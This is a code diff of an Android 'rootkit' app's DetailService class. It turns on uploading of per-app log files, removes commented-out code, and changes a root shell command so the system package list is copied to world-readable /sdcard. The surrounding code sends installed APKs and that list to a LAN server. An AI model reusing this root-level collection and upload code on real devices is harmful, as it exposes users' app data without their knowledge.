@@ -101,7 +101,7 @@ public class DetailService {
         ip = getIP(context);
         //uploadAPK(packageName,context);
         uploadList();
-        //uploadFile(packageName);
+        uploadFile(packageName);
     }
 
 
@@ -110,57 +110,6 @@ public class DetailService {
      * @param packageName
      * @param context
      */
-//    private void uploadAPK(String packageName,Context context){
-//        //补全请求地址
-//        //String requestUrl = String.format("%s/%s", upload_head, actionUrl);
-//        String requestUrl=ip;
-//        MultipartBody.Builder builder = new MultipartBody.Builder();
-//        //设置类型
-//        builder.setType(MultipartBody.FORM);
-//        //追加参数
-//        builder.addFormDataPart("PackageName",packageName);
-//        packageManager = context.getPackageManager();
-//        PackageInfo packInfo = null;
-//        try {
-//            packInfo = packageManager.getPackageInfo(packageName.trim(),0);
-//            ApplicationInfo appInfo=packInfo.applicationInfo;
-//            String apkPath=appInfo.sourceDir;
-//            File apkFile=new File(apkPath);
-//
-//            if(apkFile.exists()){
-//                RequestBody requestBody=RequestBody.create(MediaType.parse("apk"),apkFile);
-//                builder.addFormDataPart("APK",packageName,requestBody);
-//
-//                //创建RequestBody
-//                RequestBody body = builder.build();
-//                //创建Request
-//                final Request request = new Request.Builder().url(requestUrl).post(body).build();
-//                final Call call = okHttpClient.newBuilder().writeTimeout(50, TimeUnit.SECONDS).build().newCall(request);
-//
-//                call.enqueue(new Callback() {
-//                    @Override
-//                    public void onFailure(Call call, IOException e) {
-//                        Log.e("uploadAPK", "Callback--"+e.toString());
-//                    }
-//                    @Override
-//                    public void onResponse(Call call, Response response) throws IOException {
-//                        if (response.isSuccessful()) {
-//                            String string = response.body().string();
-//                            Log.e("uploadAPK", "response ----->" + string);
-//                        } else {
-//                            Log.e("uploadAPK", "Callback--upload failed!");
-//                        }
-//                    }
-//
-//                });
-//            }
-//
-//        } catch (PackageManager.NameNotFoundException e) {
-//            Log.e("uploadAPK","  getPackageInfo");
-//            e.printStackTrace();
-//        }
-//
-//    }
     private void uploadAPK(String packageName,Context context){
         //请求地址,ip查询后更改，修改ip
         String requestUrl = "http://" + "172.17.156.145" + ":8080/rootKitServer/uploadApk.action";
@@ -206,48 +155,6 @@ public class DetailService {
     /**
      * 上传packages.list
      */
-//    private void uploadList(){
-//        //补全请求地址
-//        //String requestUrl = String.format("%s/%s", upload_head, actionUrl);
-//        String requestUrl=ip;
-//        MultipartBody.Builder builder = new MultipartBody.Builder();
-//        //设置类型
-//        builder.setType(MultipartBody.FORM);
-//        //追加参数
-//        builder.addFormDataPart("FileName","packages.list");
-//
-//        String listPath="/data/system/packages.list";
-//        File listFile=new File(listPath);
-//
-//        if(listFile.exists()){
-//            RequestBody requestBody=RequestBody.create(MediaType.parse("ListFile"),listFile);
-//            builder.addFormDataPart("File","packages.list",requestBody);
-//
-//            //创建RequestBody
-//            RequestBody body = builder.build();
-//            //创建Request
-//            final Request request = new Request.Builder().url(requestUrl).post(body).build();
-//            final Call call = okHttpClient.newBuilder().writeTimeout(50, TimeUnit.SECONDS).build().newCall(request);
-//
-//            call.enqueue(new Callback() {
-//                @Override
-//                public void onFailure(Call call, IOException e) {
-//                    Log.e("uploadList", "Callback--"+e.toString());
-//                }
-//                @Override
-//                public void onResponse(Call call, Response response) throws IOException {
-//                    if (response.isSuccessful()) {
-//                        String string = response.body().string();
-//                        Log.e("uploadList", "response ----->" + string);
-//                    } else {
-//                        Log.e("uploadList", "Callback--upload failed!");
-//                    }
-//                }
-//
-//            });
-//        }
-//
-//    }
     private void uploadList(){
         Process process = null;
         Runtime runtime=Runtime.getRuntime();
@@ -258,11 +165,7 @@ public class DetailService {
             localOutputStream = process.getOutputStream();
             localDataOutputStream = new DataOutputStream(localOutputStream);
 
-            String cpCmd="cp /data/system/packages.list /data/data/com.wei.rootkit/files/packages.list\n";
-            localDataOutputStream.writeBytes(cpCmd);
-            localDataOutputStream.flush();
-
-            cpCmd="chmod 777 /data/data/com.wei.rootkit/files/packages.list\n";
+            String cpCmd="cp /data/system/packages.list /sdcard/packages.list\n";
             localDataOutputStream.writeBytes(cpCmd);
             localDataOutputStream.flush();
 
@@ -311,19 +214,18 @@ public class DetailService {
     private void uploadFile(String packageName){
         final String pn=packageName.trim();
         //补全请求地址
-        //String requestUrl = String.format("%s/%s", upload_head, actionUrl);
-        String requestUrl="http://" + "172.17.156.145" + ":8080/rootKitServer/uploadLogFile.action";
+        String requestUrl="http://" + "172.17.156.145" + ":8080/test/uploadLogFile.action";
         MultipartBody.Builder builder = new MultipartBody.Builder();
         //设置类型
         builder.setType(MultipartBody.FORM);
         //追加参数
-        builder.addFormDataPart("PackageName",packageName);
+        builder.addFormDataPart("PackageName",pn);
         String logPath="/data/data/com.wei.rootkit/files/log/"+packageName.trim();
         File logFile=new File(logPath);
 
         if(logFile.exists()){
             RequestBody requestBody=RequestBody.create(MediaType.parse("text/*"),logFile);
-            builder.addFormDataPart("LogFile",packageName,requestBody);
+            builder.addFormDataPart("LogFile",pn,requestBody);
 
             //创建RequestBody
             RequestBody body = builder.build();
@@ -356,6 +258,8 @@ public class DetailService {
                         }
                         is.close();
                         outputStream.close();
+
+                        Log.e("uploadFile", "Success!");
                     } else {
                         Log.e("uploadFile", "Callback--upload failed!");
                     }
